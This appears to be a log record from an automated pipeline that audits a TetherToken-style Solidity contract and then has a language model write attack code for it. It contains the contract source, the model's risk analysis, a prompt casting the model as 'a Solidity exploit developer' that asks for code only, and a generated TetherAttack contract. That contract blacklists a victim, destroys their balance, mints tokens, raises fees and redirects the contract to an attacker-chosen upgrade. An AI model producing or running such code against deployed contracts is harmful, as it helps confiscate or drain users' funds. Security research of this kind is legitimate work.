_allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:  \n- Pausable functionality (can pause/unpause transfers by owner)  \n- BlackList functionality (owner can blacklist addresses, preventing them from transferring tokens)  \n- Upgradeability (can deprecate itself and forward calls to an upgraded contract)  \n- Fee mechanism (basisPointsRate and maximumFee, though currently zero)  \n- Minting (issue) and burning (redeem) tokens by the owner  \n- Ability for owner to destroy tokens held by blacklisted addresses  \n\nThe contract inherits from:  \n- Ownable (owner control)  \n- StandardToken (ERC20 implementation with allowance)  \n- BlackList (blacklisting and destroying blacklisted funds)  \n- Pausable (emergency stop)  \n\nThe contract holds no ETH but manages token balances representing user funds.\n\n2. Vulnerability Assessment:  \n\n**a) Centralization and Privilege Risks**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can add/remove addresses from blacklist arbitrarily.  \n  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  \n  - Can mint (issue) unlimited new tokens to self.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect calls to an upgraded contract.  \n- These powers create a centralization risk and potential for abuse or theft by the owner.\n\n**b) Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  \n- This is a backdoor to confiscate tokens from any user if blacklisted.  \n- No user consent or appeal mechanism exists.\n\n**c) Upgradeability Risks**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all ERC20 functions forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control over their tokens.  \n- No multisig or timelock on upgrade, so owner can upgrade instantly.\n\n**d) Fee Parameters**  \n- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.\n\n**e) ERC20 Approve Race Condition**  \n- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is standard but still requires careful use by users.\n\n**f) No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic.  \n- No payable functions or ETH transfers.  \n- No external calls in state-changing functions that could cause reentrancy.\n\n3. Exploitation Requirements:  \n\n- To exploit the blacklist and destroy funds, attacker must be the owner or compromise the owner key.  \n- To exploit upgradeability, attacker must be the owner to set a malicious upgraded contract.  \n- To exploit fee mechanism, attacker must be the owner to set fees and drain user balances gradually.  \n- No direct user-exploitable bugs or reentrancy vulnerabilities found.  \n- The main risk is centralized control by the owner, which can be abused if the owner is malicious or compromised.\n\n---\n\n**Summary:**  \n- Solidity version: `pragma solidity ^0.4.17;`  \n- The TetherToken contract is a centralized ERC20 token with owner-controlled blacklist, minting, burning, pausing, and upgradeability.  \n- The owner has powerful backdoors to confiscate tokens, pause transfers, mint unlimited tokens, and upgrade to arbitrary contracts.  \n- No direct technical vulnerabilities like reentrancy or math bugs were found.  \n- The main security concern is the high level of trust and control vested in the owner, which can lead to economic exploits or censorship.', 'contract_analysis': 'The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:  \n- Pausable functionality (can pause/unpause transfers by owner)  \n- BlackList functionality (owner can blacklist addresses, preventing them from transferring tokens)  \n- Upgradeability (can deprecate itself and forward calls to an upgraded contract)  \n- Fee mechanism (basisPointsRate and maximumFee, though currently zero)  \n- Minting (issue) and burning (redeem) tokens by the owner  \n- Ability for owner to destroy tokens held by blacklisted addresses  \n\nThe contract inherits from:  \n- Ownable (owner control)  \n- StandardToken (ERC20 implementation with allowance)  \n- BlackList (blacklisting and destroying blacklisted funds)  \n- Pausable (emergency stop)  \n\nThe contract holds no ETH but manages token balances representing user funds.\n\n2.', 'vulnerability_assessment': '**a) Centralization and Privilege Risks**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can add/remove addresses from blacklist arbitrarily.  \n  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  \n  - Can mint (issue) unlimited new tokens to self.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect calls to an upgraded contract.  \n- These powers create a centralization risk and potential for abuse or theft by the owner.\n\n**b) Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  \n- This is a backdoor to confiscate tokens from any user if blacklisted.  \n- No user consent or appeal mechanism exists.\n\n**c) Upgradeability Risks**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all ERC20 functions forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control over their tokens.  \n- No multisig or timelock on upgrade, so owner can upgrade instantly.\n\n**d) Fee Parameters**  \n- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.\n\n**e) ERC20 Approve Race Condition**  \n- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is standard but still requires careful use by users.\n\n**f) No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic.  \n- No payable functions or ETH transfers.  \n- No external calls in state-changing functions that could cause reentrancy.\n\n3.', 'exploitation_requirements': '- To exploit the blacklist and destroy funds, attacker must be the owner or compromise the owner key.  \n- To exploit upgradeability, attacker must be the owner to set a malicious upgraded contract.  \n- To exploit fee mechanism, attacker must be the owner to set fees and drain user balances gradually.  \n- No direct user-exploitable bugs or reentrancy vulnerabilities found.  \n- The main risk is centralized control by the owner, which can be abused if the owner is malicious or compromised.', 'analysis_duration': 23.32493257522583}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:  \n- Pausable functionality (can pause/unpause transfers by owner)  \n- BlackList functionality (owner can blacklist addresses, preventing them from transferring tokens)  \n- Upgradeability (can deprecate itself and forward calls to an upgraded contract)  \n- Fee mechanism (basisPointsRate and maximumFee, though currently zero)  \n- Minting (issue) and burning (redeem) tokens by the owner  \n- Ability for owner to destroy tokens held by blacklisted addresses  \n\nThe contract inherits from:  \n- Ownable (owner control)  \n- StandardToken (ERC20 implementation with allowance)  \n- BlackList (blacklisting and destroying blacklisted funds)  \n- Pausable (emergency stop)  \n\nThe contract holds no ETH but manages token balances representing user funds.\n\n2.\n\nVulnerability Assessment: **a) Centralization and Privilege Risks**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can add/remove addresses from blacklist arbitrarily.  \n  - Can destroy all tokens of any blacklisted address (effectively confiscate tokens).  \n  - Can mint (issue) unlimited new tokens to self.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect calls to an upgraded contract.  \n- These powers create a centralization risk and potential for abuse or theft by the owner.\n\n**b) Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out the balance of any blacklisted user and reduce total supply accordingly.  \n- This is a backdoor to confiscate tokens from any user if blacklisted.  \n- No user consent or appeal mechanism exists.\n\n**c) Upgradeability Risks**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all ERC20 functions forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control over their tokens.  \n- No multisig or timelock on upgrade, so owner can upgrade instantly.\n\n**d) Fee Parameters**  \n- The owner can set fee parameters (`basisPointsRate` and `maximumFee`) with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- Although fees are currently zero, the owner can enable fees up to 0.2% and max 50 tokens per transfer, which can be used to drain user balances over time.\n\n**e) ERC20 Approve Race Condition**  \n- The `approve` function implements the known ERC20 race condition mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is standard but still requires careful use by users.\n\n**f) No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic.  \n- No payable functions or ETH transfers.  \n- No external calls in state-changing functions that could cause reentrancy.\n\n3.\n\nExploitation Requirements: - To exploit the blacklist and destroy funds, attacker must be the owner or compromise the owner key.  \n- To exploit upgradeability, attacker must be the owner to set a malicious upgraded contract.  \n- To exploit fee mechanism, attacker must be the owner to set fees and drain user balances gradually.  \n- No direct user-exploitable bugs or reentrancy vulnerabilities found.  \n- The main risk is centralized control by the owner, which can be abused if the owner is malicious or compromised.\n\n\nTarget Contract Address: 0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': "```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function addBlackList(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function issue(uint amount) external;\n    function transfer(address to, uint value) external returns (bool);\n}\n\ncontract TetherAttack {\n    ITetherToken public target;\n    address public owner;\n\n    function TetherAttack(address _target) public {\n        target = ITetherToken(_target);\n        owner = msg.sender;\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        target.addBlackList(victim);\n\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n\n        // Mint new tokens to self\n        target.issue(1000000 ether);\n\n        // Set fees to drain users (0.2% max fee 50 tokens)\n        target.setParams(20, 50 ether);\n\n        // Deprecate to malicious upgraded contract\n        target.deprecate(upgradedContract);\n    }\n}\n```", 'code': "pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function addBlackList(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function issue(uint amount) external;\n    function transfer(address to, uint value) external returns (bool);\n}\n\ncontract TetherAttack {\n    ITetherToken public target;\n    address public owner;\n\n    function TetherAttack(address _target) public {\n        target = ITetherToken(_target);\n        owner = msg.sender;\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        target.addBlackList(victim);\n\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n\n        // Mint new tokens to self\n        target.issue(1000000 ether);\n\n        // Set fees to drain users (0.2% max fee 50 tokens)\n        target.setParams(20, 50 ether);\n\n        // Deprecate to malicious upgraded contract\n        target.deprecate(upgradedContract);\n    }\n}", 'code_type': 'solidity', 'attack_duration': 5.051624774932861}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0jyceoup.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        